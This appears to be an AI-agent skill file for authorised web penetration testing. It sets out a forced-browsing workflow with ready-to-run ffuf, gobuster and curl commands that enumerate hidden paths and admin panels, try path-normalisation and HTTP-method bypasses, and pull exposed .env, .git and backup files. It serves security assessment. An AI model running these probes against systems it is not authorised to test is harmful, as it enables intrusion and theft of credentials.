---
name: bypassing-authentication-with-forced-browsing
description: Discovering and accessing unprotected pages, APIs, and administrative interfaces by enumerating URLs and bypassing authentication controls during authorized security assessments.
subdomain: web-application-security
facing: source
mitre_attack:
- T1190
- T1083
- T1087
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
upstream: bypassing-authentication-with-forced-browsing@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.

## Codegraph (do this first)
1. `codegraph_explore "authentication check and session handling"` — locate the guard that decides a request is authenticated, and the callers that reach it; `callers` for the path into it. Output = read.
2. Changing shared code: `codegraph callers <fn>` + `codegraph impact <fn>` before editing. One root-cause fix, owning layer, every call site covered.
3. Tests: `git diff --name-only | codegraph affected --stdin`. None at the seam = add one.
4. Before "unused"/rename/delete: `codegraph sync`, then grep. No graph yet: grep for the sinks above.
Any "grep/search the codebase" step below → use these calls instead; keep grep for strings, config and dynamic refs.

## Prerequisites

- **Authorization**: Written penetration testing agreement covering directory enumeration
- **ffuf**: Fast web fuzzer (`go install github.com/ffuf/ffuf/v2@latest`)
- **Gobuster**: Directory brute-force tool (`apt install gobuster`)
- **Burp Suite**: For intercepting and analyzing requests and responses
- **Wordlists**: SecLists collection (`git clone https://github.com/danielmiessler/SecLists.git`)
- **Target access**: Network connectivity and valid test credentials for authenticated comparison

## Workflow

### Step 1: Enumerate Hidden Directories and Files

Use ffuf or Gobuster to discover paths not linked in application's navigation.

```bash
# Directory enumeration with ffuf
ffuf -u https://target.example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,301,302,403 \
  -fc 404 \
  -o results-dirs.json -of json \
  -t 50 -rate 100

# File enumeration with common extensions
ffuf -u https://target.example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -e .php,.asp,.aspx,.jsp,.html,.js,.json,.xml,.bak,.old,.txt,.cfg,.conf,.env \
  -mc 200,301,302,403 \
  -fc 404 \
  -o results-files.json -of json \
  -t 50 -rate 100

# Gobuster for directory enumeration
gobuster dir -u https://target.example.com \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -s "200,204,301,302,307,403" \
  -x php,asp,aspx,jsp,html \
  -o gobuster-results.txt \
  -t 50
```

### Step 2: Discover Administrative and Debug Interfaces

Target common administrative paths and debug endpoints.

```bash
# Admin panel enumeration
ffuf -u https://target.example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302 \
  -t 50 -rate 100

# Common admin paths to check manually:
# /admin, /administrator, /admin-panel, /wp-admin
# /cpanel, /phpmyadmin, /adminer, /manager
# /console, /debug, /actuator, /swagger-ui
# /graphql, /graphiql, /.env, /server-status

# API endpoint discovery
ffuf -u https://target.example.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403 \
  -fc 404 \
  -o api-results.json -of json

# Check for Spring Boot Actuator endpoints
for endpoint in env health info beans configprops mappings trace; do
  curl -s -o /dev/null -w "%{http_code} /actuator/$endpoint\n" \
    "https://target.example.com/actuator/$endpoint"
done
```

### Step 3: Test Authentication Enforcement on Discovered Endpoints

Compare responses between unauthenticated and authenticated requests.

```bash
# Test without authentication
curl -s -o /dev/null -w "%{http_code}" \
  "https://target.example.com/admin/dashboard"

# Test with valid session cookie
curl -s -o /dev/null -w "%{http_code}" \
  -b "session=valid_session_token_here" \
  "https://target.example.com/admin/dashboard"

# Automated check: compare response sizes
# Unauthenticated request
curl -s "https://target.example.com/admin/users" | wc -c

# Authenticated request
curl -s -b "session=valid_token" \
  "https://target.example.com/admin/users" | wc -c

# If both return similar content, authentication is not enforced

# Test with Burp Intruder: send a list of discovered URLs
# without cookies and flag any 200 responses
```

### Step 4: Test HTTP Method-Based Authentication Bypass

Some applications only enforce authentication for specific HTTP methods.

```bash
# Test different HTTP methods on protected endpoints
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" "https://target.example.com/admin/settings"
done

# Test HTTP method override headers
curl -s -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "X-HTTP-Method-Override: GET" \
  "https://target.example.com/admin/settings"

curl -s -o /dev/null -w "%{http_code}" \
  -H "X-Original-Method: GET" \
  -H "X-Rewrite-URL: /admin/settings" \
  "https://target.example.com/"
```

### Step 5: Test Path Traversal and URL Normalization Bypass

Exploit URL parsing differences to bypass path-based authentication rules.

```bash
# Path normalization bypass attempts
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/ADMIN/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/./dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/public/../admin/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin%2fdashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/;/admin/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin;anything/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/.;/admin/dashboard"

# Double URL encoding
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/%2561dmin/dashboard"

# Trailing characters
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard/"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard.json"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard%00"
```

### Step 6: Discover Backup and Configuration Files

Search for sensitive files inadvertently exposed on web server.

```bash
# Backup file discovery
ffuf -u https://target.example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -e .bak,.old,.orig,.save,.swp,.tmp,.dist,.config,.sql,.gz,.tar,.zip \
  -mc 200 -t 50 -rate 100

# Common sensitive files
for file in .env .git/config .git/HEAD .svn/entries \
  web.config wp-config.php.bak config.php.old \
  database.yml .htpasswd server-status phpinfo.php \
  robots.txt sitemap.xml crossdomain.xml; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.example.com/$file")
  if [ "$status" != "404" ]; then
    echo "FOUND ($status): $file"
  fi
done

# Git repository exposure check
curl -s "https://target.example.com/.git/HEAD"
# If this returns "ref: refs/heads/main", the git repo is exposed
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Forced Browsing** | Directly accessing URLs that are not linked but exist on server |
| **Directory Enumeration** | Brute-forcing directory and file names against wordlist to discover hidden content |
| **Authentication Bypass** | Accessing protected resources without valid credentials due to missing access checks |
| **Path Normalization** | Exploiting differences in how web servers and application frameworks parse URL paths |
| **Method-based Bypass** | Using alternative HTTP methods (PUT, DELETE) that may not have authentication checks |
| **Information Disclosure** | Exposure of sensitive configuration files, backups, or debug interfaces |
| **Defense in Depth** | Layered security controls where authentication is enforced at multiple levels |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **ffuf** | Fast web fuzzer for directory, file, and parameter enumeration |
| **Gobuster** | Directory and DNS brute-forcing tool written in Go |
| **Feroxbuster** | Recursive content discovery tool with automatic recursion |
| **DirBuster** | OWASP Java-based directory brute-force tool with GUI |
| **Burp Suite** | HTTP proxy for request interception and automated scanning |
| **SecLists** | Comprehensive collection of wordlists for security testing |

### Scenario 1: Exposed Admin Panel

Admin panel at `/admin/` is only hidden by not being linked in navigation. Direct URL access reveals full administrative interface without any authentication check.

### Scenario 2: Unprotected API Endpoints

API endpoints at `/api/v1/users` and `/api/v1/settings` require authentication in frontend application but backend API does not enforce session validation, allowing unauthenticated direct access.

### Scenario 3: Backup File Containing Credentials

Developer left `config.php.bak` on production server. This backup file contains database credentials in plaintext, discovered through extension-based enumeration.

### Scenario 4: Spring Boot Actuator Exposure

The `/actuator/env` endpoint is exposed without authentication, revealing environment variables including database connection strings, API keys, and secrets.

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/bypassing-authentication-with-forced-browsing
